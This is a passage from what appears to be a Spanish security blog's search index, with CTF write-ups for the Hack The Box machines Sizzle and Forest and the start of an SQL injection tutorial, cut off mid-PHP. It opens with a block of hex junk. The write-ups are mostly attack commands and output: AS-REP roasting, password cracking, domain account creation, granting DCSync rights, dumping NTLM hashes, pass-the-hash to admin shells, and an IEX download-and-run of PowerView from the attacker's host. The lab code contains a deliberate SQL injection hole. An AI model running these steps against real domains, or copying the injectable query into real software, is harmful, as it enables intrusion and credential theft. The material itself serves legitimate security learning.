70b01d71df5f7b313b1c0430102b8b4f815eee195f3b27cc1900a7f8c457612da76c9ad95d3a5cfa3220c2c26da25c7a0a8edc95ad85baa386b808326ad2347c3c30e79abe85964fabc4423ff0fe786885022de638027b030784bde2f4816922ab0ad795ba5c5fcae70a01b0e731ee48a39041989c409aca5e84648d1c322f36e213db9988a9550cc5477f77adb681cb310306f00324bbad57b98844d2a426f32f946fd2f2fdba4117a1ae4299fcb60aa4c6e71eea3168e7f1ff30dbff3e62de87cf27bdd66e64e0c9579a6dbc2eabdcf9b83fe7cbf5982762b1d53226d6e6a1107d32d46f5b0128d3ecfd9da61f8235e942734762d5771c92b85480dcd66d3924110131793ebb4885ff197760ca596d9264b4ed1f2d6c7865149d00511737b6eac12a0d7c531535ab5a65087eb510507c5f29d1Vamos a crackearlo utilizando john.❯ john --w=/usr/share/wordlists/rockyou.txt hashEstas serían las credenciales del usuario “mrlky:Football#7”.DCSync AttackAhora que tenemos las crendeciales del usuario “mrlky”, vamos a realizar un DCSync attack, yo voy a utilizar secrectsdump para realizar este ataque.❯ impacket-secretsdump htb.local/mrlky@10.10.10.103Impacket v0.9.22 - Copyright 2020 SecureAuth CorporationPassword:[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)[*] Using the DRSUAPI method to get NTDS.DIT secretsAdministrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8::: ---SKIP---Vamos a probar las credenciales en crackmapexec.❯ crackmapexec smb 10.10.10.103 -u Administrator -H 'f6b7160bfc91823792e0ac3a162c9267'SMB 10.10.10.103 445 SIZZLE [*] Windows 10.0 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:False)SMB 10.10.10.103 445 SIZZLE [+] HTB.LOCAL\\Administrator:f6b7160bfc91823792e0ac3a162c9267 (Pwn3d!)Shell como AdministradorNos conectamos por smb utilizando psexec.❯ impacket-psexec htb.local/Administrator@10.10.10.103 -hashes :f6b7160bfc91823792e0ac3a162c9267Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation[*] Requesting shares on 10.10.10.103.....[*] Found writable share ADMIN$[*] Uploading file cNnRZHCw.exe[*] Opening SVCManager on 10.10.10.103.....[*] Creating service WHtp on 10.10.10.103.....[*] Starting service WHtp.....[!] Press help for extra shell commandsMicrosoft Windows [Version 10.0.14393](c) 2016 Microsoft Corporation. All rights reserved.C:\\Windows\\system32&gt; type C:\\Users\\mrlky\\Desktop\\user.txtf0ccc98fcd28d1cf****************C:\\Windows\\system32&gt;type C:\\Users\\Administrator\\Desktop\\root.txt7b5fbfac66ab8dc7****************" }, { "title": "Forest Writeup", "url": "/posts/writeup-forest/", "categories": "Writeup, HTB", "tags": "Windows, CTF, Easy, Directorio Activo, Crackeo Contraseñas, Kerberos, DCSync", "date": "2022-08-27 00:00:00 +0200", "snippet": "Máquina Easy, en la que nos aprovechamos de un Null Session por rpc para conseguir una lista de usuarios, probamos un AS-REP Roast de tal forma que conseguimos el hash de un usuario, por último nos aprovechamos de los privilegios de nuestro grupo para ir escalando entre usuarios hasta el administradorRecopilación de InformaciónPrimero vamos a comprobar la conectividad con la máquina.❯ ping -c 1 10.10.10.161PING 10.10.10.161 (10.10.10.161) 56(84) bytes of data.64 bytes from 10.10.10.161: icmp_seq=1 ttl=127 time=30.9 ms--- 10.10.10.161 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 30.856/30.856/30.856/0.000 msEn la salida del comando anterior se puede ver un parámetro llamado ttl, gracias a este parámetro podemos saber que sistema operativo está corriendo en la máquina víctima. GNU/Linux = TTL 64 Windows = TTL 128En este caso, el sistema operativo que está corriendo en la máquina víctima es Windows.Vamos a usar la herramienta nmap para descubrir que puertos están abiertos y que servicios estan asociados a estos.❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.161 -oG allPorts -p- -&gt; Escanea todos los puertos (65535) –open -&gt; Muestra solo los puertos con un estatus “open” -sS -&gt; Aplica un TCP SYN Scan –min-rate 5000 -&gt; Indica que quiero emitir paquetes no más lentos que 5000 paquetes por segundo -vvv -&gt; Muestra la información en pantalla a medida que se descubre -n -&gt; Indica que no aplique resolución DNS -Pn -&gt; Indica que no aplique el protocolo ARP 10.10.10.161 -&gt; Dirección IP que se quiere escanear -oG allPorts -&gt; Exporta el output a un fichero grepeable con nombre “allPorts”Este sería el output del escaneo:Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-27 22:30 CESTScanning 10.10.10.161 [65535 ports]PORT STATE SERVICE REASON53/tcp open domain syn-ack ttl 12788/tcp open kerberos-sec syn-ack ttl 127135/tcp open msrpc syn-ack ttl 127139/tcp open netbios-ssn syn-ack ttl 127445/tcp open microsoft-ds syn-ack ttl 127464/tcp open kpasswd5 syn-ack ttl 127593/tcp open http-rpc-epmap syn-ack ttl 1279389/tcp open adws syn-ack ttl 12747001/tcp open winrm syn-ack ttl 12749671/tcp open unknown syn-ack ttl 12749677/tcp open unknown syn-ack ttl 12749684/tcp open unknown syn-ack ttl 12749703/tcp open unknown syn-ack ttl 12749921/tcp open unknown syn-ack ttl 127Ahora vamos a realizar un escaneo más profundo, también con nmap pero esta vez solamente lanzaremos scripts básicos de enumeración y analizaremos la versión de los puertos abiertos obtenidos anteriormente.❯ nmap -p53,88,135,139,445,464,593,9389,47001,49671,49677,49684,49703,49921 -sC -sV 10.10.10.161 -oN targeted -p53,88,135,139,445,464,593,9389,47001,49671,49677,49684,49703,49921 -&gt; Indica los puertos que se quieren escanear -sC -&gt; Lanza scripts básicos de enumeración -sV -&gt; Enumera la versión y servicio que está corriendo en los puertos 10.10.10.161 -&gt; Dirección IP que se quiere escanear -oN targeted -&gt; Exporta el output a un fichero en formato nmap con nombre “targeted”Este sería el output del escaneo:Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-27 22:40 CESTNmap scan report for 10.10.10.161PORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-08-27 20:47:00Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.09389/tcp open mc-nmf .NET Message Framing47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-title: Not Found|_http-server-header: Microsoft-HTTPAPI/2.049671/tcp open msrpc Microsoft Windows RPC49677/tcp open msrpc Microsoft Windows RPC49684/tcp open msrpc Microsoft Windows RPC49703/tcp open msrpc Microsoft Windows RPC49921/tcp open msrpc Microsoft Windows RPCService Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-security-mode: | 3.1.1: |_ Message signing enabled and required| smb2-time: | date: 2022-08-27T20:47:50|_ start_date: 2022-08-27T20:23:31| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: required|_clock-skew: mean: 2h26m52s, deviation: 4h02m31s, median: 6m50s| smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)| Computer name: FOREST| NetBIOS computer name: FOREST\\x00| Domain name: htb.local| Forest name: htb.local| FQDN: FOREST.htb.local|_ System time: 2022-08-27T13:47:51-07:00Los puertos abiertos y sus servicios asocidados son: 53/tcp -&gt; DNS 88/tcp -&gt; Kerberos 135/tcp -&gt; RPC 139/tcp -&gt; RPC 445/tcp -&gt; SMB 464/tcp -&gt; kpasswd 593/tcp -&gt; ncacn_http 9389/tcp -&gt; mc-nmf 47001/tcp -&gt; http 49671/tcp -&gt; msrpc 49677/tcp -&gt; msrpc 49684/tcp -&gt; msrpc 49703/tcp -&gt; msrpc 49921/tcp -&gt; msrpcBusqueda de vulnerabilidadesVamos a ver que nos encontramos en el puerto 445 (SMB), haremos uso de un “Null Session” junto con herramientas para enumerar este puerto. Entre ellas, crackmapexec, smbclient y smbmap.❯ crackmapexec smb 10.10.10.161SMB 10.10.10.161 445 FOREST [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)❯ smbclient -L 10.10.10.161 -NAnonymous login successful\tSharename Type Comment\t--------- ---- -------SMB1 disabled -- no workgroup available❯ smbmap -H 10.10.10.161[+] IP: 10.10.10.161:445\tName: 10.10.10.161Vemos que no tenemos acceso a ningun recurso compartido a nivel de red. Además, vemos la versión de Windows que está corriendo la máquina “Windows Server 2016 Standard 14393 x64”y nos dan el dominio que está siendo utilizado, esta información nos va a ser muy importante en el futuro, metedlo en el /etc/hosts, lo podeis hacer con el siguiente comando.echo \"10.10.10.161 htb.local\" | sudo tee -a /etc/hostsYa que de momento no tenemos algo demasiado interesante vamos a probar con rpcclient para ver si podemos enumerar los usuarios y otra información.❯ rpcclient -U \"\" -N 10.10.10.161 -c \"enumdomusers\" | grep -oP \"\\[.*?\\]\" | grep -v 0x | tr -d \"[]\" &gt; usersAdministratorGuestkrbtgtDefaultAccount$331000-VK4ADACQNUCASM_2c8eef0a09b545acbSM_ca8c2ed5bdab4dc9bSM_75a538d3025e4db9aSM_681f53d4942840e18SM_1b41c9286325456bbSM_9b69f1b9d2cc45549SM_7c96b981967141ebbSM_c75ee099d0a64c91bSM_1ffab36a2f5f479cbHealthMailboxc3d7722HealthMailboxfc9daadHealthMailboxc0a90c9HealthMailbox670628eHealthMailbox968e74dHealthMailbox6ded678HealthMailbox83d6781HealthMailboxfd87238HealthMailboxb01ac64HealthMailbox7108a4eHealthMailbox0659cc1sebastienlucindasvc-alfrescoandymarksantiAñadido a esto, podemo utilizar la herramienta rpcenum para enumerar los usuarios administradores del dominio, todos los grupos y descripciones de grupos y usuarios.❯ rpcenum -i 10.10.10.161 -e All[*] Enumerating Domain Users... + + | Users | + + | Administrator | | Guest | | krbtgt | | DefaultAccount | | $331000-VK4ADACQNUCA | | SM_2c8eef0a09b545acb | | SM_ca8c2ed5bdab4dc9b | | SM_75a538d3025e4db9a | | SM_681f53d4942840e18 | | SM_1b41c9286325456bb | | SM_9b69f1b9d2cc45549 | | SM_7c96b981967141ebb | | SM_c75ee099d0a64c91b | | SM_1ffab36a2f5f479cb | | HealthMailboxc3d7722 | | HealthMailboxfc9daad | | HealthMailboxc0a90c9 | | HealthMailbox670628e | | HealthMailbox968e74d | | HealthMailbox6ded678 | | HealthMailbox83d6781 | | HealthMailboxfd87238 | | HealthMailboxb01ac64 | | HealthMailbox7108a4e | | HealthMailbox0659cc1 | | sebastien | | lucinda | | svc-alfresco | | andy | | mark | | santi | + +[*] Listing domain users with description... + + + | User | Description | + + + | Administrator | Built-in account for administering the computer/domain | | Guest | Built-in account for guest access to the computer/domain | | krbtgt | Key Distribution Center Service Account | | DefaultAccount | A user account managed by the system. | + + +[*] Enumerating Domain Admin Users... + + | DomainAdminUsers | + + | Administrator | + +No nos reporta nada demasiado interesante, vamos a centrarnos en los usuarios obtenidos anteriormente. En estos momentos, cuando disponemos de una lista de usuarios sin contraseñas, podemos probar un AS-REP Roasting.Explotación¿Qué es un AS-REP Roasting?Un ataque de AS-REP Roasting se aprovecha de una mala configuración en los usuarios, más concretamente al tener activa la flag “DONT_REQUIRE_PREAUTH”, cuando un usuario tiene esta flag activa nosotros como atacantes vamos a ser capaces de ver su TGT (Ticket Granting Ticket) que posteriormente intentaremos crackear. Para realizar este ataque, necesitaremos una lista de usuarios sobre la que probar.❯ impacket-GetNPUsers htb.local/ -no-pass -usersfile usersImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)[-] User HealthMailboxc3d7722 doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User HealthMailboxfc9daad doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User HealthMailboxc0a90c9 doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User HealthMailbox670628e doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User HealthMailbox968e74d doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User HealthMailbox6ded678 doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User HealthMailbox83d6781 doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User HealthMailboxfd87238 doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User HealthMailboxb01ac64 doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User HealthMailbox7108a4e doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User HealthMailbox0659cc1 doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set$krb5asrep$23$svc-alfresco@HTB.LOCAL:8d5e62b5eb294fd30e5731ee6d823af1$868e0a28b6cdfb776c93e282f41f92505644e85c61532ef673e339ee9efa2f72f211d133c780ec8152980e3bddd4e853fee9307b76ea5394065febf0d3308c84394d840bf6e6d7849180b33b8860c3f18343ac5aa344870f742baf071bdad656f52ad4b1be0e91d801913ea67d2f54e920a0a091e72c595f1d1248b2cf16f6b032f8562cfa8377ebb865ba2c5d04f6b22f727bf8f480d2062b63aa9cec449fa5cce3623fa06bad5a36098302c17ad8f53c4d6278d363ad70f81a1b57c2a5b91b83ea491a06677f305575acc39828f6d01be778e9b4f6759cb2230e6c7e58d6a217ccc248ef5e[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)Vemos que hemos conseguido el Ticket TGT del usuario “svc-alfresco”, vamos a intentar crackearlo con john para conseguir su contraseña.❯ john --w=/usr/share/wordlists/rockyou.txt hashUsing default input encoding: UTF-8Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])Will run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statuss3rvice ($krb5asrep$23$svc-alfresco@HTB.LOCAL)1g 0:00:00:05 DONE (2022-08-28 00:48) 0.1733g/s 708103p/s 708103c/s 708103C/s s4553592..s3r2s1Use the \"--show\" option to display all of the cracked passwords reliablySession completedHemos conseguido crackear el hash, las credenciales quedarían así “svc-alfresco:s3rvice”, vamos a comprobar si son validas realmente, lo haremos en evil-winrm y smb.❯ crackmapexec smb 10.10.10.161 -u \"svc-alfresco\" -p \"s3rvice\"SMB 10.10.10.161 445 FOREST [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)SMB 10.10.10.161 445 FOREST [+] htb.local\\svc-alfresco:s3rvice ❯ crackmapexec winrm 10.10.10.161 -u \"svc-alfresco\" -p \"s3rvice\"SMB 10.10.10.161 5985 FOREST [*] Windows 10.0 Build 14393 (name:FOREST) (domain:htb.local)HTTP 10.10.10.161 5985 FOREST [*] http://10.10.10.161:5985/wsmanWINRM 10.10.10.161 5985 FOREST [+] htb.local\\svc-alfresco:s3rvice (Pwn3d!)Las credenciales son validas para smb y evil-winrm, sin embargo, solo tenemos “Pwn3d!” en evil-winrm por lo que solo podremos conseguir una consola mediante evil-winrm. Vamos a conectarnos a la máquina víctima usando evil-winrm.❯ evil-winrm -i 10.10.10.161 -u \"svc-alfresco\" -p \"s3rvice\"Ya tenemos acceso a la máquina víctima mediante el uso de evil-winrm, vamos a leer la flag del usuario.&gt; type C:\\Users\\svc-alfresco\\Desktop\\user.txt0b0560aa2d00b065****************Post-explotaciónVamos a realizar un pequeño reconocimiento manual.&gt; whoami /privPRIVILEGES INFORMATION----------------------Privilege Name Description State============================= ============================== =======SeMachineAccountPrivilege Add workstations to domain EnabledSeChangeNotifyPrivilege Bypass traverse checking EnabledSeIncreaseWorkingSetPrivilege Increase a process working set Enabled&gt; net user svc-alfrescoUser name svc-alfrescoFull Name svc-alfrescoCommentUser's commentCountry/region code 000 (System Default)Account active YesAccount expires NeverPassword last set 8/27/2022 4:41:32 PMPassword expires NeverPassword changeable 8/28/2022 4:41:32 PMPassword required YesUser may change password YesWorkstations allowed AllLogon scriptUser profileHome directoryLast logon 8/27/2022 3:49:57 PMLogon hours allowed AllLocal Group MembershipsGlobal Group memberships *Domain Users *Service AccountsThe command completed successfully.No vemos nada fuera de lo normal, vamos a utilizar bloodhound para que nos muestre de que formas podemos escalar privilegios. Lo primero que necesitaremos será conseguir el comprimido con el cual vamos a operar desde bloodhound. Esto lo haremos con el propio ingestor que trae bloodhound, en este caso vamos a utilizar la version en python.❯ bloodhound-python -c All -u 'svc-alfresco' -p 's3rvice' -ns 10.10.10.161 -d htb.local --zipYa con el zip en nuestra máquina, nos abriremos neo4j y bloodhound para poder ver esta información (si nunca habeis utilizado neo4j antes os pedirán que cambieis la contraseña, las credenciales por defecto para acceder son “neo4j:neo4j”).❯ neo4j console❯ bloodhound &gt; /dev/null &amp;Cuando ya tengamos totalmente abierto bloodhound tendremos que subir los datos, esto lo haremos desde el siguiente boton.Subimos los datosCuando ya tengamos los datos subidos en bloodhound buscaremos en la barra superior derecha el usuario que hemos logrado comprometer, en este caso “svc-alfresco” y lo marcaremos como “Mark User as Owned”.Marcamos como usuario comprometidoYa marcado como un usuario comprometido le daremos doble click izquierdo en el usuario para entrar en el “Node Info” del usuario “svc-alfresco”. Luego iremos a la pestaña que dice “Reachable High Values Target”Marcamos como usuario comprometidoEsta pestaña nos da información de gran valor, podemos ver que nuestro usuario, “svc-alfresco”, pertenece al grupo “SERVICE ACCOUNTS” este a su vez pertenece al grupo “PRIVILEGED IT ACCOUNTS” y este a su vez pertenece al grupo “ACCOUNT OPERATORS” vemos que este grupo tiene el privilegio “GenericAll” sobre el grupo “EXCHANGE WINDOWS PERMISSIONS”.Si buscamos acerca del grupo “ACCOUNT OPERATORS” veremos que este grupo nos permite crear/modificar/eliminar usuarios, objetos y grupos. Podemos aprovecharnos de esto para crear un usuario en el grupo “EXCHANGE WINDOWS PERMISSIONS” de tal forma que estaremos un paso más cerca de llegar al Controlador de Dominio.&gt; net user xdann1 xdann123$! /add /domainThe command completed successfully.&gt; net group \"Exchange Windows Permissions\" xdann1 /addThe command completed successfully.El usuario que hemos creado ya debería estar en el grupo “EXCHANGE WINDOWS PERMISSIONS”, vamos a comprobarlo.&gt; net user xdann1User name xdann1Full NameCommentUser's commentCountry/region code 000 (System Default)Account active YesAccount expires NeverPassword last set 8/27/2022 8:32:38 PMPassword expires NeverPassword changeable 8/28/2022 8:32:38 PMPassword required YesUser may change password YesWorkstations allowed AllLogon scriptUser profileHome directoryLast logon NeverLogon hours allowed AllLocal Group MembershipsGlobal Group memberships *Exchange Windows Perm*Domain UsersThe command completed successfully.Vemos que nuestro usuario ya está en el grupo “EXCHANGE WINDOWS PERMISSIONS”, ahora como tenemos este grupo vamos a ver si tenemos algún privilegio sobre algo. En la foto anterior podemos ver que el grupo “EXCHANGE WINDOWS PERMISSIONS” tiene el privilegio “WriteDacl” sobre el Controlador de dominio, vamos a aprovecharnos de esto.Antes de nada, necesitamos importar el módulo de “PowerView” ya que lo necesitaremos más tarde al utilizar la utilidad “Add-DomainObjectAcl”.❯ wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1❯ python3 -m http.server 80&gt; IEX(New-Object Net.WebClient).downloadString('http://10.10.14.12/PowerView.ps1')Una vez importado con exito el módulo, vamos a proceder a realizar la explotación que explican en bloodhound.&gt; $SecPassword = ConvertTo-SecureString 'xdann123$!' -AsPlainText -Force&gt; $Cred = New-Object System.Management.Automation.PSCredential('htb.local\\xdann1', $SecPassword)&gt; Add-DomainObjectAcl -Credential $Cred -TargetIdentity \"DC=htb,DC=local\" -PrincipalIdentity xdann1 -Rights DCSyncYa tenemos al usuario en el DCSync, ahora en vez de usar lo que nos dicen en bloodhound utilizaremos secretsdump para dumpear los hashes de los usuarios utilizando el usuario que acabamos de crear.❯ impacket-secretsdump htb.local/xdann1@10.10.10.161Impacket v0.9.22 - Copyright 2020 SecureAuth CorporationPassword:[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)[*] Using the DRSUAPI method to get NTDS.DIT secretshtb.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: ---SKIP---Tenemos el hash del usuario administrador, vamos a probarlo utilizando pass the hash.❯ crackmapexec smb 10.10.10.161 -u \"Administrator\" -H \"32693b11e6aa90eb43d32c72a07ceea6\"SMB 10.10.10.161 445 FOREST [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)SMB 10.10.10.161 445 FOREST [+] htb.local\\Administrator:32693b11e6aa90eb43d32c72a07ceea6 (Pwn3d!)❯ crackmapexec winrm 10.10.10.161 -u \"Administrator\" -H \"32693b11e6aa90eb43d32c72a07ceea6\"SMB 10.10.10.161 5985 FOREST [*] Windows 10.0 Build 14393 (name:FOREST) (domain:htb.local)HTTP 10.10.10.161 5985 FOREST [*] http://10.10.10.161:5985/wsmanWINRM 10.10.10.161 5985 FOREST [+] htb.local\\Administrator:32693b11e6aa90eb43d32c72a07ceea6 (Pwn3d!)Son validas para el smb y evil-winrm, vamos a conectarnos por evil-winrm.❯ evil-winrm -i 10.10.10.161 -u \"Administrator\" -H \"32693b11e6aa90eb43d32c72a07ceea6\"&gt; type ../Desktop/root.txtb97caa55b20adb9d***************" }, { "title": "Inyecciones SQL", "url": "/posts/inyecciones-sql/", "categories": "Explicación, SQLi", "tags": "SQLi, Laboratorio", "date": "2022-07-12 00:00:00 +0200", "snippet": "Si has entrado en este post es porque quieres aprender sobre las inyecciones SQL, sin embargo, siempre he creido que primero hay que aprender a andar antes de querer correr, por lo que primero aprenderemos que es SQL y para que se utiliza.¿Qué es SQL?SQL por sus siglas en inglés significa Lenguaje de Consulta Estructurada (Structured Query Language), es un lenguaje de consulta estructurada diseñado para actualizar, obtener, y calcular información en bases de datos.¿Para qué se utiliza SQL?La mayoría de las aplicaciones web modernas utilizan una estructura de base de datos en el back-end. Dichas bases de datos se utilizan para almacenar y recuperar datos relacionados con la aplicación web, desde el contenido web hasta la información y contenido del usuario, etc. Para que las aplicaciones web sean dinámicas, la aplicación web debe interactuar con una base de datos en tiempo real. A medida que llegan solicitudes HTTP(S) del usuario, el back-end de la aplicación web emitirá consultas a la base de datos para generar la respuesta.Inyecciones SQLUna inyección SQL (SQLi) es una vulnerabilidad de seguridad que ocurre cuando un usuario malintencionado pasa una entrada que cambia la consulta SQL final enviada por la aplicación web a la base de datos, en otras palabras, la inyección ocurre cuando una aplicación interpreta la entrada del usuario como código en lugar de una cadena, cambiando el flujo del código y ejecutándolo. Esto le permite al usuario realizar otras consultas no deseadas directamente en la base de datos.Hay muchas formas de lograr esto. Para que funcione una inyección SQL, el atacante primero debe inyectar código y luego subvertir la lógica de la aplicación web cambiando la consulta original o ejecutando una completamente nueva. Entonces, el atacante tendrá que inyectar código fuera de los límites esperados de entrada del usuario, por lo que no se ejecuta como una simple entrada del usuario. En el caso más básico, esto se hace inyectando una comilla simple ( ‘) o una comilla doble ( “) para escapar de los límites de entrada del usuario e inyectar datos directamente en la consulta SQL.Una vez que un atacante es capaz de inyectar código, debe buscar una forma de ejecutar una consulta SQL diferente. Esto se puede hacer usando código SQL para crear una consulta funcional que ejecute tanto la consulta SQL prevista como la nueva. Hay muchas formas de lograr esto, como usar consultas STACKED o consultas UNION. Finalmente, para recuperar el resultado de nuestra nueva consulta, debemos interpretarlo o capturarlo en el front-end de la aplicación web.Usos de inyecciones SQLUna inyección SQL puede tener un impacto tremendo, especialmente si los privilegios en el servidor back-end y la base de datos son muy permisivos.Primero, podemos recuperar información secreta/sensible que no debería ser visible para nosotros, como inicios de sesión y contraseñas de usuarios o información de tarjetas de crédito, que luego se pueden usar para otros fines poco éticos. Las inyecciones SQL provocan muchas filtraciones de contraseñas y datos contra sitios web, que luego se reutilizan para robar cuentas de usuarios, acceder a otros servicios o realizar otras acciones maliciosas.Otro caso de uso de la inyección de SQL es subvertir la lógica de la aplicación web. El ejemplo más común de esto es omitir el inicio de sesión sin pasar unas credenciales válidas. Otro ejemplo es el acceso a funciones que están bloqueadas para usuarios específicos, como los paneles de administración. Los atacantes también pueden leer y escribir archivos directamente en el servidor de back-end, lo que, a su vez, puede llevar a colocar puertas traseras en el servidor back-end , consiguiendo así control directo sobre él.Tipos de inyecciones SQLLas inyecciones SQL se clasifican según de cómo y dónde podemos leer su salida.Esquema inyecciones SQL In-band: la salida de la consulta es mostrada directamente en el front-end, por lo que podemos leerla directamente. Union Based: utiliza la orden UNION para combinar los resultados de varias consultas SELECT, esto nos permite crear una consulta secundaria dentro de la principal Error Based: utilizamos los errores PHP o SQL del front-end para que nos devuelva la salida de la consulta. Blind: no obtenemos la salida de la consulta directamente, tendremos que utilizar la lógica SQL para recuperar la salida letra por letra. Boolean Based: utiliza las condicionales de SQL para controlar si la página devuelve un valor TRUE, es decir, si la letra es válida la página nos respondera , de caso contrario no lo hará. Time Based: utiliza condicionales que retrasan la respuesta de la página si devuelven un valor TRUE, es decir, si la letra es válida la página tardará más de lo normal en responder. Out-of-band: en algunos casos no tendremos acceso directo a la salida de la consulta, por lo que tendremos que redirigir la salida a otro lugar, por ejemplo, a un registro DNS o peticiones HTTP(S).Creación de laboratorio para practicar inyecciones SQLSaber la teoría está muy bien, sin embargo, esto no nos sirve de nada si no sabemos llevarlo a la práctica. Es por esto que en este apartado profundizaremos en la creación de un laboratorio que nos permita practicar los distintos tipos de inyecciones SQL. Si no quereis crear el laboratorio podéis practicarlas haciendo alguna de las máquinas de plataformas como Hack The Box o TryHackme.Para la creación de nuestro laboratorio de pruebas utilizaremos el software MariaDB y Apache. Lo primero que tendremos que hacer es iniciar ambos servicios, podéis ver como hacerlo desde aqui.Cuando ya tengamos iniciados ambos servicios vamos a proceder a crear la estructura de la base de datos que vamos a utilizar, os dejo un post en el que explican como hacerlo. Así nos quedarían las dos tablas con sus respectivos datos.Base de datos TiendaTabla de Usuarios+------+----------+--------------+---------------+| id | nombre | contraseña | rol |+------+----------+--------------+---------------+| 1 | admin | admin123 | administrador || 2 | usuario1 | usuario1_123 | usuario || 3 | usuario2 | usuario2_123 | usuario || 4 | usuario3 | usuario3_123 | usuario || 5 | vendedor | vendedor123 | vendedor |+------+----------+--------------+---------------+Tabla de Productos+------+---------+---------------------------------------------------+| id | nombre | descripcion |+------+---------+---------------------------------------------------+| 1 | teclado | lo puedes usar para escribir || 2 | raton | lo usas para interactuar con la interfaz grafica || 3 | monitor | puedes ver cosas en el || 4 | silla | te sientas en ella || 5 | cascos | puedes escuchar cosas con el |+------+---------+---------------------------------------------------+Vamos a usar el siguiente código para conectar la base de datos a una aplicación web (necesitais un usuario que tenga los privilegios necesarios, os dejo un post que explica como hacerlo).&lt;?php// Datos$dbhostname = 'localhost';$dbuser = 'usuario';$dbpassword = 'contraseña';$dbname = 'nombreBasedeDatos';//Creamos la conexion$connection = mysqli_connect($dbhostname, $dbuser, $dbpassword, $dbname);//Comprobamos si se ha hecho bien la conexionif (!$connection) { echo mysqli_error($connection); die();}// Parametro con el cual recogemos el input$input= $_GET['nombre'];// Definimos consulta a Mariadb$query = \"SELECT id, nombre, descripcion FROM Productos WHERE nombre='$input'\";// Lanzamos la consulta$results = mysqli_query($connection, $query);// Comprobamos si se ha hecho bien la consultaif (!$results) { echo mysqli_error($connection); die();}// Obtenemos y mostramos ls resultados de la consulta. Los resultados se almacenan en un array por el cual iteramoswhile ($rows = mysqli_fetch_assoc($results)) {\techo 